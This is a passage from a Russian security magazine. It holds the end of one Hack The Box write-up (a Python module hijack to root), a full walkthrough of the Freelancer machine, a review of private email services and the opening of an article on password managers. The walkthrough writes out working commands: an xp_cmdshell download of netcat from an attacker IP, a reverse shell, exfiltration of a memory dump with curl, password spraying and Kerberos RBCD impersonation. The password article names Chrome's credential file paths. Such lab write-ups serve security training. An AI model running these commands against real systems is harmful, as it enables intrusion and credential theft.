Теперь разберемся с исполняемым файлом. Утилита  file сообщает, что
это  обычный  скрипт  на  Bash.  Внутри  скрипта  выполняется /models/
evaluate_model.py, которому передается файл Pickle.





                  Содержимое файла evaluate_model.py

В каталоге /models, куда мы имеем право записи, уже присутствует pickle-
файл demo_model.pth, который можно будет использовать для теста.





                      Содержимое каталога /models

Проанализируем сам скрипт evaluate_model.py. Сразу обратим внимание
на первую строку — import torch. Если мы создадим в каталоге со скриптом
файл torch.py, то он будет выполнен перед всем скриптом.





                  Содержимое файла evaluate_model.py

В файл torch.py запишем код, который будет запускать командную оболочку
Bash.  Так  как  у  скрипта  будут  высокие  привилегии,  при  запуске
evaluate_model создастся шелл в контексте пользователя root.


echo 'import os; os.system("bash")' > /models/torch.py


sudo /usr/bin/evaluate_model /models/demo_model.pth





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу, как через запросы к сер‐
веру MS SQL  можно  получить  сессию
на хосте. Но прежде используем ошибку
в логике приложения и повысим привиле‐
гии на сайте через IDOR. А получив доступ             RalfHacker                                                                                             hackerralf8@gmail.com
к Windows, вытащим учетные данные поль‐
зователя из  дампа  оперативной памяти
и захватим контроллер домена, применив
технику RBCD.


Наша цель — получение прав суперпользователя на машине Freelancer
с учебной площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.5    freelancer.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

По результатам сканирования имеем много открытых портов:
 • 53 — DNS;
 • 80 (HTTP) — веб‑сервер Nginx 1.25.5;
 • 88 — Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC);
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

На SMB  анонимной  аутентификации  нет,  поэтому посмотрим, что там
на веб‑сервере.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте есть возможность регистрации и авторизации. Причем можно выб‐
рать роль пользователя Freelancer или Employer. Первым делом я зарегистри‐
ровался с ролью Freelancer.





                    Форма регистрации Freelancer





                        Профиль пользователя

Потратив немного времени, чтобы осмотреться в доступном пользователю
окружении, ничего интересного не находим. Взглянем на отличия в окру‐
жении у пользователей с ролью Employer. Для этого нужно зарегистрировать
второй аккаунт, однако он по умолчанию почему‑то неактивен.





                 Сообщение о состоянии учетной записи

На сайте есть возможность восстановления пароля. Попробуем «восста‐
новить» неактивную учетную запись. Для этого потребуется ответить на воп‐
росы, указанные при регистрации аккаунта. После этого нам станет доступна
форма изменения пароля.





                   Форма восстановления аккаунта





                      Форма изменения пароля

После смены пароля и повторной авторизации наша учетная запись неожи‐
данно стала активна.





                        Профиль пользователя

Пунктов меню стало гораздо больше. Очень интересен раздел с QR-кодом.





                           Страница QR-Code

Декодируем QR-код и получаем ссылку. При переходе по ссылке мы оказыва‐
емся в профиле пользователя.





                           Данные в QR-коде




                      История запросов в Burp History

Я запросил новый QR-код, разлогинился, перешел по ссылке из кода и снова
оказался в профиле пользователя. Такая ссылка валидна всего один раз,
но куда интереснее, из чего она состоит: в ней есть какие‑то данные в фор‐
мате Base64. После декодирования предполагаем, что это идентификатор
пользователя.





                       Декодированные данные в URI

В таких случаях стоит проверять, привязан ли код OTP к ID аккаунта или нет.
Для этого я сделал еще один аккаунт, получил ссылку из QR-кода в первом
аккаунте, поменял имеющийся в ней ID на ID второго аккаунта, перешел
по этой ссылке и попал во второй аккаунт. Таким образом, мы имеем уяз‐
вимость Account Takeover и можем получить доступ к любой учетной записи.
   Найти ссылки на другие аккаунты можно на страницах блога.





                             Страница блога

Переходим к любому из аккаунтов и получаем профиль пользователя. Куда
интереснее то, что в URI профиля присутствует ID аккаунта.





                        Профиль пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     HTB FREELANCER
        АТАКУЕМ MICROSOFT SQL SERVER
        И АНАЛИЗИРУЕМ ДАМП ПАМЯТИ





ТОЧКА ОПОРЫ

Перебрать все аккаунты по ID можно с помощью Burp Intruder. Переправим
запрос из Burp History в Burp Intruder комбинацией клавиш Ctrl-R.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads

В таблице результатов после выбора запроса в ответе переключаемся на тип
отображения Render. Проходим по таблице и находим админа, ID его акка‐
унта равен 2.





                   Burp Intruder — результат перебора

Повторяем атаку с захватом аккаунта и получаем сессию администратора.





                     Профиль пользователя admin

Затем переходим к админке сайта на странице /admin.





                     Панель администрирования сайта

В подменю Development tools есть возможность работы с SQL-терминалом.


Microsoft SQL Server
Так как сервер работает под управлением Windows, предположим, что
и СУБД будет фирменная, то есть MS SQL Server. Первым делом узнаем
текущего пользователя.


SELECT SYSTEM_USER;





                        Пользователь базы данных

Привилегий у пользователя никаких нет, поэтому проверим, не может ли он
олицетворять другие учетные записи.


SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.
server_principals b ON a.grantor_principal_id = b.principal_id WHERE
a.permission_name = 'IMPERSONATE';





                           Настройки олицетворения

Видим, что текущий пользователь может перейти в контекст стандартной
учетной записи sa. Эта учетка по умолчанию обладает ролью sysadmin
и может  использовать  функцию xp_cmdshell  для  выполнения команд
в командной оболочке на сервере. Попробуем от имени sa выполнить коман‐
ду whoami.


EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';





                          Результат выполнения запроса

В ошибке сказано, что функция xp_cmdshell отключена. Однако мы можем
ее включить.


EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;





                     Включение функции xp_cmdshell

А теперь повторим команду whoami.


EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';





                          Результат выполнения запроса

Команда успешно выполнена, а значит, запустим у себя веб‑сервер:


python3 -m http.server 8000

И листенер, который будет принимать соединение:


rlwrap nc -nlvp 4321

После  этого  на  удаленном  сервере  скачиваем  netcat  и  выполняем
реверс‑шелл.


EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'curl http://10.10.16.35:8000/nc64.exe -o C:\\
Windows\\Tasks\\n.exe';
EXEC xp_cmdshell 'C:\Windows\Tasks\n.exe -e cmd 10.10.16.35 4321';

И сразу же получаем сессию на своем листенере.





                       Сессия пользователя sql_svc


ПРОДВИЖЕНИЕ

Пользователь mikasaAckerman
Первым делом проверим, какие пользователи работали за компьютером.
У каждого юзера есть домашний каталог в директории C:\Users.





                      Содержимое каталога C:\Users

Теперь осматриваем окружение пользователя. В загрузках есть профиль сер‐
вера Microsoft SQL.





                   Содержимое каталога SQL-сервера

Проверяем файлы с настройками и в sql-Configuration.INI находим аж
два пароля.





                 Содержимое файла sql-Configuration.INI

Новые пароли спреим по всем собранным ранее учетным записям поль‐
зователей с помощью NetExec. Так компрометируем еще одну учетную
запись mikasaAckerman.


nxc smb 10.10.11.5 -u users.txt -p pass.txt




                           Проверка учетных данных

Получив учетные данные, сразу соберем базу BloodHound. Это можно сде‐
лать с помощью того же NetExec, только предварительно обновим содер‐
жимое файла /etc/hosts.


10.10.11.5 freelancer.htb DC.freelancer.htb

Для сбора данных используем подключение по LDAP. Необходимо указать
параметры --bloodhound и --dns-server.


nxc ldap DC.freelancer.htb -u mikasaAckerman -p IL0v3ErenY3ager -d
freelancer.htb --bloodhound -c All --dns-server 10.10.11.5

Когда база собрана, получим сессию от имени нового пользователя. Для это‐
го запускаем новый листенер и используем утилиту RunasCs, чтобы получить
реверс‑шелл.


r.exe mikasaAckerman IL0v3ErenY3ager cmd -r 10.10.16.35:5432





                       Получение сессии пользователя





                       Флаг пользователя


Пользователь lorra199
Осматриваемся в окружении нового пользователя и, кроме файла с флагом,
находим копию сообщения и какой‑то непонятный файл, предположительно
дамп памяти.





                Содержимое рабочего стола пользователя

В сообщении упоминается регулярный BSOD и полный дамп памяти. А зна‐
чит, мы можем проанализировать дамп и найти в нем файлы с учетными дан‐
ными.





                       Содержимое файла mail.txt

Чтобы скачать файл с удаленной системы без всяких фреймворков, восполь‐
зуемся специальным веб‑сервером HTTPServerWithUpload . Запускаем его
на локальном хосте, а на удаленной машине грузим файл через curl.


curl -X POST http://10.10.16.35:8000/ -H "Content-Type: multipart/
form-data" -F file=@"MEMORY.7z"





                        Загрузка файла на веб‑сервер

Чтобы  проанализировать  сырой  дамп  памяти,  можем  использовать
MemProcFS . Утилита распарсит файлы и позволит работать с ними, как в
подмонтированной файловой системе.


./memprocfs -device ../MEMORY.DMP -mount /mnt





                       Монтирование дампа памяти

Посмотрим, что есть в дампе. Первым делом меня заинтересовал дамп реес‐
тра — registry.





                       Содержимое дампа памяти

Из реестра мы можем извлечь файлы SAM, SYSTEM и SECURITY, откуда мы
выудим хеши и, возможно, даже пароли служб.





                     Содержимое каталога hive_files

Копируем файлы и извлекаем все учетные данные с помощью impacket-
secretsdump.


secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive
-system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security
0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive LOCAL





                         Полученные учетные данные

Есть один пароль от учетной записи службы. Спреим его по всем учеткам
и компрометируем еще одну.


nxc smb 10.10.11.5 -u users.txt -p 'PWN3D#l0rr@Armessa199'




                         Подбор учетных данных


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Так как скомпрометировали новую учетную запись, проверяем ее права
на другие объекты при помощи BloodHound. Как показывает граф, поль‐
зователь lorra199 входит в группу AD Recycle Bin, которая имеет право
GenericWrite на машинную учетную запись DC.





                       Граф BloodHound

Это право позволяет скомпрометировать машинную учетную запись через
RBCD-делегирование Kerberos. Но для этого нам нужна еще одна подкон‐
трольная машинная учетная запись. По умолчанию любой пользователь
домена может  создать  несколько  таких  учеток.  Проверить  это  можно
с помощью NetExec.


nxc ldap DC.freelancer.htb -u mikasaAckerman -p IL0v3ErenY3ager -d
freelancer.htb -M maq




                 Значение атрибута MachineAccountQuota

Теперь используем тулзу bloodyAD, чтобы создать новую учетку, а затем
записать ее SID в атрибут msDS-AllowedToActOnBehalfOfOtherIdentity
учетной записи контроллера домена.


bloodyAD --host 10.10.11.5 -u lorra199 -p 'PWN3D#l0rr@Armessa199' -d
freelancer.htb add computer evil_pc 'RRrr!!11'


bloodyAD --host 10.10.11.5 -u lorra199 -p 'PWN3D#l0rr@Armessa199' -d
freelancer.htb add rbcd 'DC$' 'EVIL_PC$'





                                Настройка RBCD

Для работы с Kerberos необходимо синхронизировать время с контроллером
домена.


sudo timedatectl set-ntp false
sudo ntpdate -s 10.10.11.5

Затем, используя созданную учетку, можем получить тикет через запросы
S4U2Self и S4U2Proxy на имя администратора c помощью скрипта getST
из набора скриптов impacket.


getST.py -dc-ip 10.10.11.5 -spn 'CIFS/DC.freelancer.htb' -impersonate
'Administrator' 'freelancer.htb/EVIL_PC$:RRrr!!11' 2>/dev/null





                              Запрос тикета

После получения тикета можем использовать технику Pass the Ticket для дос‐
тупа к целевому  хосту. Экспортируем билет и подключаемся к серверу
по WMI.


KRB5CCNAME=Administrator@CIFS_DC.freelancer.htb@FREELANCER.HTB.
ccache wmiexec.py freelancer.htb/Administrator@DC.freelancer.htb
-no-pass -k





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





Популярность      электронной      почты
для общения потихоньку  падает, но без
«мыла» в наше время все равно никуда.
Часто на него завязаны аккаунты, на него
приходит разная чувствительная инфа, так              Nik Zerof                                                                                              xtahi0nix@gmail.com
что кража или утечка почты — вещь крайне
неприятная.  Традиционные  провайдеры
не дают высокого уровня защиты и кон‐
фиденциальности,    поэтому     сегодня
поговорим  о  специальных  защищенных
сервисах.


В чем их принципиальное отличие? В первую очередь — должно поддержи‐
ваться сквозное шифрование, а также неплохо бы иметь какие‑то гарантии
отсутствия потенциальной слежки. Как известно, даже если содержимое
зашифровано, время отправки сообщения и адресат все еще могут сказать
о многом.
  К сожалению, мы сможем лишь посмотреть, что обещают создатели сер‐
висов, а не проверить эти обещания. Иногда в таких вопросах приходится
ориентироваться по косвенным признакам. Их и разберем.


КРИТЕРИИ ВЫБОРА

Главными ориентирами нам послужат открытый исходный код, репутация
страны, где располагаются мощности, и, конечно же, наличие и качество
шифрования данных.


Открытый исходный код
Под открытыми исходниками я имею в виду открытость и кодов программ
(клиентов), и серверного бэка. Само собой, ПО с открытым исходным кодом
намного легче изучить, что делает его более надежным с точки зрения
безопасности. Любой специалист может проанализировать код на наличие
уязвимостей, бэкдоров или других проблем, связанных с безопасностью.
Это снижает (хотя и не исключает полностью) вероятность скрытого сбора
данных или использования вредоносных компонентов. Также активное сооб‐
щество разработчиков, поддерживающих проект, часто способствует быс‐
трому исправлению ошибок и повышению надежности сервиса.


Юрисдикция
Юрисдикция, или страна, в которой зарегистрирован сервис, — это важный
фактор для защиты данных. Разные государства имеют разные законы,
регулирующие вопросы конфиденциальности, слежки и доступа к данным.
Например, сервисы, работающие в странах альянса «14 глаз», могут быть
вынуждены передавать данные пользователей правительственным службам.
Поэтому стоит выбирать страны с сильными законами о защите данных
и высоким уровнем уважения к приватности, такие как Швейцария, Швеция
или Германия, где действует строгая политика в отношении пользовательских
данных и вмешательства со стороны властей. Кроме этого, нужно вниматель‐
но читать политику конфиденциальности и условия использования — в этих
документах тоже может быть много интересного. В обзоре я старался избе‐
гать стран, в которых есть аналоги NSL (письма о национальной безопас‐
ности) и Gag order, широко используемых в США.


Шифрование
Шифрование — это основа безопасности данных в современных онлайновых
сервисах. Оно обеспечивает конфиденциальность, гарантируя, что доступ
к данным могут получить только авторизованные пользователи. При выборе
сервиса следует учитывать, какие типы шифрования использует почта, хранит
ли  письма  в  зашифрованном  виде,  есть ли  возможность  передавать
защищенные письма в сторонние почтовые ящики.
  На мой взгляд, это основные критерии, но есть еще несколько пунктов,
на которые хотелось бы обратить внимание: возможность создать почту
без номера телефона или каких‑то других данных и возможность оплачивать
сервис криптовалютой (либо использовать бесплатный тариф). Эти пункты я
тоже включу в критерии обзора.


             INFO

                   В обзор не входит почта с обязательной деано‐
                          нимизацией  пользователя:  когда  запрашивают
                     номер  телефона  или  отсутствует  бесплатный
                       тариф, а криптовалютой оплатить невозможно.





PROTONMAIL

 • Сайт: proton.me
 • Открытый исходный код: да (клиентская часть)
 • Принимает крипту: да
 • Анонимная регистрация: частично (требуется только email)
 • Юрисдикция: Швейцария

Наверное, самая популярная почта в этом обзоре, что, впрочем, неуди‐
вительно: базируется в Швейцарии, создана учеными CERN, позиционирует
себя как один из самых защищенных почтовых сервисов в мире! Код фрон‐
тенда открыт, в том числе и криптографическая составляющая. Кроме того,
у Proton есть сайт в сети Tor. Регулярно публикуется отчет о прозрачности
и свидетельство канарейки — информация о запросах данных правоох‐
ранительными органами. Тут можно возмутиться: если владельцы заботятся
о конфиденциальности, то почему вообще выполняют такие запросы? Но все
мы живем в реальном мире, и юридическое лицо, находящееся в Швейцарии,
должно выполнять законы Швейцарии, от этого никуда не денешься. Хорошо,
что отчеты об этом вообще публикуются.
   Почта шифруется и находится в зашифрованном состоянии на серверах
ProtonMail. Если оба корреспондента используют ProtonMail, то письма рас‐
шифровываются  только получателями. Можно отправить зашифрованное
письмо адресату, не пользующемуся ProtonMail, — тогда ему придет только
письмо со ссылкой на сервер Proton, по которой будет приглашение на ввод
пароля. Пароль придется сообщить адресату по другому каналу — по ана‐
логии с любым симметричным шифрованием. Еще плюс — за сервис можно
платить криптовалютой, если не хватит возможностей бесплатного тарифного
плана.
   У ProtonMail действительно много плюсов, но есть и минусы. Например,
в самом начале ProtonMail позиционировался как почта, находящаяся только
в Швейцарии, вместе с серверами. По факту в политике конфиденциальности
написано, что серверы находятся в двух странах — Швейцарии и Германии.
  При  регистрации нужно  указать почтовый ящик для  восстановления.
Это не проблема, но было бы круто, если бы для регистрации не требовалось
вообще никаких данных.





TUTA

 • Сайт: tuta.com
 • Открытый исходный код: да (клиентская часть)
 • Принимает крипту: да (частично)
 • Анонимная регистрация: да
 • Юрисдикция: Германия

Перед нами защищенная почта из Германии — Tutanota. Тоже достойный кан‐
дидат: доступен отчет о прозрачности, вся хранимая переписка зашиф‐
рована, открыты исходники почтовых приложений, как и в ProtonMail, есть
возможность слать защищенные письма на сторонний ящик — принцип тот
же, нужно будет ввести пароль для расшифровки письма по ссылке.
  Из минусов — бэкдор, установленный по решению немецкого суда. Ком‐
пания уверяет, что все письма, зашифрованные до появления бэкдора, рас‐
шифровать нельзя. Кроме того, бэкдор не действует на письма, зашифрован‐
ные end-to-end. Такое шифрование работает, если оба участника переписки
имеют ящик на Tutanota. Через бэкдор могут быть прочитаны незашифрован‐
ные письма, поступающие на серверы Tutanota.
  Еще небольшой минус — не принимается оплата криптовалютой, но это
легко обойти: сама компания предлагает покупать подарочные карты через
крипту, а ими оплачивать почту. Да и бесплатный тариф тоже есть. Но имей
в виду: в соответствии с политикой конфиденциальности компании все пла‐
тежные данные собираются. То же касается и персональных данных, которые
ты сам укажешь, — так написано в пользовательском соглашении. Хорошо,
что хоть для регистрации не обязательно указывать никакие данные и можно
оставаться анонимным.





MAILFENCE

 • Сайт: mailfence.com
 • Открытый исходный код: нет
 • Принимает крипту: нет
 • Анонимная регистрация: частично (требуется только email)
 • Юрисдикция: Бельгия

Офис компании находится в Бельгии, как и все серверы. Здесь есть как бес‐
платный тарифный  план,  так и  платный. Можно  включить шифрование
переписки: использовать либо OpenPGP, либо шифрование по паролю.
Во втором случае адресату придет только письмо со ссылкой на сервер
Mailfence, по которой будет приглашение ввести пароль. Точно так же, как в
предыдущих двух сервисах, пароль нужно передавать отдельно. Примеча‐
тельно, что при использовании OpenPGP можно генерировать пары ключей
для каждого адресата. Еще из положительных моментов: сервис поддержи‐
вает отчеты о прозрачности и свидетельство канарейки.
  Из минусов: на официальном сайте говорится о возможности оплатить
в криптовалютах, хотя по факту ее нет (так мне ответили в поддержке сер‐
виса), но зато есть бесплатный тарифный план. Исходный код почтовика зак‐
рыт. Кроме этого, в политике конфиденциальности указано, что компания
собирает и хранит IP-адреса, платежные данные и еще кучу информации.
Настораживает и фраза «входящие и исходящие сообщения автоматически
анализируются нашими процедурами проверки на предмет спама, вирусов
и злоупотреблений» — довольно интересная заявка от компании, которая
обещает полную конфиденциальность. Ну и при регистрации нужно будет
ввести внешний адрес почты, чтобы получить код активации и продолжить
регистрацию.





RUNBOX

 • Сайт: runbox.com
 • Открытый исходный код: нет
 • Принимает крипту: да
 • Анонимная регистрация: частично (требуется только email)
 • Юрисдикция: Норвегия

Сайт этого почтового сервиса на каждом шагу пытается убедить пользовате‐
ля, насколько крутая здесь защита переписки и насколько сильно разработ‐
чики сервиса заботятся о безопасности пользовательских данных. Давай
посмотрим, чего стоит эта реклама и как дела обстоят в реальности.
  Из хорошего: за почту можно платить криптовалютой! Но, кажется, на этом
плюсы и заканчиваются.
  Для регистрации требуется ввести сторонний адрес электронной почты,
и если не активировать учетную запись по ссылке, которая туда придет, то
не получится отправить ни одного письма: «Error: Please subscribe or validate
your alternative email address to send email from your account». Бесплатного
тарифа нет, но есть пробный семидневный период. Еще из интересного —
в политике конфиденциальности  указано, что «для обеспечения защиты
от вирусов и спама входящие и исходящие письма могут автоматически ска‐
нироваться. Кроме того, происходит автоматическое индексирование содер‐
жимого писем для предоставления возможностей поиска писем». Вот такая
вот приватность!
   Очевидно, что письма не шифруются при хранении, зато сервис рекомен‐
дует использовать OpenPGP самостоятельно. Наверное, чтобы твои письма
не читали разработчики этого полностью конфиденциального сервиса!
   Короче, это отличная демонстрация случая, когда за громкими словами
о приватности и безопасности ни того ни другого нет.


ВЫВОДЫ

Не так давно у нас был обзор защищенных мессенджеров, из которого стало
понятно, что достойных кандидатов не так уж и много. В случае с сервисами
электронной почты ситуация значительно хуже — из всех претендентов
более‑менее приемлемо выглядит ProtonMail, на втором месте — Tuta (если
не считать бэкдор!). У остальных все совсем печально: похоже, защита там
только в рекламных баннерах, которые не имеют ничего общего с реаль‐
ностью, описанной в пользовательских соглашениях.
   Конечно, выход есть — самостоятельно использовать асимметричное
шифрование при важных переписках, но это не всегда возможно со всеми
адресатами. С конфиденциальностью дела совсем плохи: у основной массы
сервисов нет бесплатных тарифов, они не принимают криптовалюты и вынуж‐
дают пользователей оплачивать услуги банковскими переводами или платеж‐
ными сервисами с процедурой KYC, полностью ставя крест на анонимности.
ПРИВАТНОСТЬ





Если  ты  используешь  разные,  да еще
и сложные пароли (а ты ведь используешь,
правда?), запомнить их все — задача прак‐
тически  непосильная.  Для  ее  решения
на  помощь  придут  специальные  прог‐         Никита Олейник                                                                                    Специалист по анализу
раммы —  менеджеры  паролей.  Какой           защищенности
из них выбрать? Вот об этом мы сегодня
и поговорим.


             INFO

                     Все выводы в статье — это личное мнение автора
                       со множеством нюансов и допущений, о которых
                        я постарался упомянуть. Менеджеры паролей —
                     обширная категория продуктов, и у каждого поль‐
                           зователя найдутся как свои субъективные пред‐
                           почтения, так и объективные доводы в свете его
                            конкретной ситуации и опыта. Я постарался объ‐
                         ять необъятное,  сохраняя,  насколько это  воз‐
                      можно, объективность, при этом у меня нет кон‐
                          фликта интересов, поэтому рекламировать того
                      или иного вендора я не стану. Буду рад, если
                         статья окажется кому‑то полезной, вызовет дис‐
                        куссии в комментариях или кто‑то из читателей
                            укажет на возможные ошибки.


Давай начнем с истории. Жил‑был Петя, в школе он создавал множество
аккаунтов на сайтах, записывая пароли (или один‑единственный пароль, что
уж греха таить) на бумажке, которую бережно хранил в одной из книг. В стар‐
ших классах ему пришла в голову идея, что пароли можно хранить в таблице
на компьютере. Новые аккаунты он заносил в таблицу, а старые не стал, ведь
браузер и приложения не просили его логиниться заново. В универе Петя
поменял компьютер, таблица с паролями перекочевала на флешку, а на
новом компьютере появился еще один файл. Поскольку иногда приходилось
создавать аккаунты вне дома, то на телефоне у Пети тоже хранилась парочка
паролей, так же как и в записной книжке. Притом он уже не помнил, от чего
именно некоторые из записанных паролей. А еще в недрах его устройств хра‐
нились волшебные SSH-ключи и магические сертификаты VPN, которые ему
помогли установить админы на первой работе. В общем, он хранил пароли
на разных устройствах — старых и новых, личных и рабочих, в разных файлах
и в книжке, не помнил, от чего некоторые из этих паролей, или, еще хуже,
помнил, от чего пароль, но не помнил, где его записал!
   Минусы  блокнотов, бумажек и  стикеров, которые  так любят  клеить
на  монитор  сотрудницы  бухгалтерии,  очевидны:  они  могут  выпасть
и  потеряться, на них можно  пролить кофе и  безвозвратно  расстаться
с паролем, соответствующим всем политикам безопасности (ведь мы все
создаем только сложные пароли, не так ли?). Кроме того, их может просто
увидеть и запомнить другой человек. Основная проблема хранения подобной
информации в телефоне заключается в том, что на нем ты не будешь держать
сертификаты, API-токены и SSH-ключи, так как это просто физически неудоб‐
но. Ну и если телефон украдут, то пароли и куча другой конфиденциальной
информации попадут в руки злоумышленников. У заметок и таблиц еще и
шифрование отсутствует, а таскать каждый день на работу ноутбук с файлом,
только чтобы иметь при себе все нужные записи, ты не будешь.
   Так что же делать? Идеальное решение — никогда не сохранять пароли
и не забывать пить таблетки для улучшения памяти. Но к сожалению, мы не в
состоянии запомнить сотню учетных записей, поэтому такой вариант Петя
сразу отмел. За решением вопроса Петя полез в интернет, залогинился
в одну из социальных сетей, и в этот момент перед ним появился поп‑ап,
предлагающий сохранить пароль. Неужели браузер может хранить все его
пароли?


БРАУЗЕРНЫЕ ХРАНИЛИЩА

Самое простое на первый взгляд решение — это воспользоваться встро‐
енным менеджером паролей браузера. На самом деле это не менеджер
паролей (почему — разберемся позже), а пока давай называть его хранили‐
щем паролей браузера (ХПБ). Плюсы очевидны: во‑первых, решение работа‐
ет из коробки; во‑вторых, данные сами подставляются в формы; в‑третьих,
как заметят опытные пользователи, ХПБ позволит избежать подстановки учет‐
ных данных на фальшивых сайтах. На этом, собственно, плюсы заканчива‐
ются. Дальше идут только минусы, и главный из них — это отсутствие шиф‐
рования.
   Дело в том, что браузер создавался не для хранения паролей, а поэтому
безопасность пользователей стоит для него ниже удобства. Разбираться
с паролями, которые необратимо зашифровались, никто не хочет, поэтому
и хранится база во вполне конкретном месте, шифруется по известному алго‐
ритму, а иногда и ключ для дешифровки лежит рядом. Именно по этой при‐
чине, строго говоря, браузерные менеджеры паролей создают скорее пси‐
хологический комфорт для пользователя, чем реальный барьер для злоумыш‐
ленника.
   Кто‑то скажет, что все это, конечно, здорово, но насколько действительно
легко получить доступ к паролям, хранящимся в браузере? Резонный вопрос!
Как отмечает Р. Д. Рассел из компании Fractional CISO, достать пароли
из браузеров Firefox, Chrome и Edge на Windows уже в 2022 году было вполне
тривиальной задачей, которая решается с помощью простого питоновского
скрипта. А Nik Zerof писал на «Хакере», как сделать подобный стилер на плю‐
сах, еще в 2018 году.
  А что же в 2024-м? Давай рассмотрим этот вопрос на примере Chrome
в различных ОС.
  На Windows Server 2019 Standard все совсем печально, база данных SQLite
3 и мастер‑ключ от нее хранятся в следующих файлах:


C:\Users\$username\AppData\Local\Google\Chrome\User Data\Default\
Login Data
C:\Users\$username\AppData\Local\Google\Chrome\User Data\Local State

Chrome блокирует базу данных, пока он работает. Мастер‑ключ закодирован
в Base64 и скрывается в переменной encrypted_key, причем при открытии
файла с мастер‑ключом никто не запрашивает дополнительных подтвержде‐
ний. Соответственно, открыв, например, файл из письма, злоумышленник
получает доступ и к базе данных, и к ключу дешифровки.


DPAPI и шифрование App-Bound
Внимательный читатель наверняка обратил внимание на то, что мы получили
доступ к базе данных и к мастер‑ключу в контексте пользователя. Дело в том,
что в Windows с 2000 года применяется механизм DPAPI (Windows Data
Protection API), который позволяет шифровать данные и которым пользуется
Chrome. Оба файла (база данных и файл с мастер‑ключом от нее) представ‐
ляют собой DPAPI blob. Немного упрощая, можно сказать, что в контексте
пользователя  этот блоб  автоматически  расшифровывается  хранящимся
в LSASS хешем пароля пользователя и мастер‑ключом DPAPI. Сделать это от
имени другого пользователя на том же компьютере было бы невозможно.
   Однако вредоносное ПО, которое старается получить твои пароли, будет
в большинстве случаев работать именно в контексте пользователя, его уста‐
новившего. Это в данном случае делает защиту DPAPI не слишком высоким
барьером. Вне  контекста пользователя можно попытаться получить хеш
пароля юзера и уже расшифрованный мастер‑ключ DPAPI атаками на LSASS
или, если твой компьютер все еще использует классический BIOS, атакой
холодной перезагрузки.
  В Google недавно озаботились этой проблемой и с версии Chrome 127
(23 июля 2024 года) внедрили новый механизм — шифрование с привязкой
к приложению. С ним данные может получить не любой процесс, запущенный
в контексте пользователя, а только Chrome, что делает ситуацию похожей
на происходящее в macOS и Linux. Однако новый механизм пока действует
только для файлов cookie и на пароли пользователей не распространяется.





                       Chrome в Windows

На macOS все сложнее. База паролей хранится в файле


/Users/$username/Library/Application Support/Google/Chrome/User Data/
Default/Login Data

А вот мастер‑ключ Chrome Safe Storage содержится уже не в простом файле,
а в связке ключей (Keychain), и по состоянию на 2024 год в macOS Ventura
13.2 для его извлечения у пользователя запрашивается пароль.





                        Chrome в macOS

В Linux ситуация аналогичная тому, что происходит на macOS, то есть база
хранится по пути ниже, а для ее расшифровки потребуется мастер‑ключ
Chrome Safe Storage Control из связки ключей (например, gnome-keyring),
для доступа к которому также необходимо ввести пароль пользователя, если,
конечно, ты специально не задал другой пароль для связки ключей изначаль‐
но.


~/.config/google-chrome/Default/Login Data

Как видим, при использовании ХПБ вредоносное ПО действительно имеет
все шансы добраться до наших паролей. На Windows это совсем просто, а на
macOS и в Linux придется приложить чуть больше усилий. Этот недостаток
ХПБ был использован, например, вымогателем Qilin в июле 2024-го, когда
перед шифрованием он вытаскивал все учетные данные браузеров Chrome
в домене.
   Отсутствие шифрования позволяет твоим коллегам или родственникам
получить и физический доступ к паролям, если ты оставишь компьютер
незаблокированным или вообще не используешь пароль на этом устройстве.
А браузерные расширения, которым мы не глядя даем все запрашиваемые
права, могут просто скачать всю базу в текстовом виде.
   У ХПБ есть еще несколько минусов. Кто‑то скажет, что база паролей хра‐
нится локально, но на самом деле мы этого не знаем, мы просто воспринима‐
ем это как факт. Еще один минус заключается в том, что ХПБ не могут хранить
ничего, кроме учетных данных и номеров банковских карт. API-ключи, сер‐
тификаты или документы и прочее ты там не сохранишь. И последнее: мы
зависимы от одного браузера на одном девайсе, то есть, храня пароли
в Safari, ты не можешь воспользоваться ими в Chrome. А если захочешь
залогиниться в один из видеосервисов на компьютере своей девушки, то
здесь вообще беда: твой девайс вместе с сохраненным паролем остался
дома.


МЕНЕДЖЕРЫ ПАРОЛЕЙ

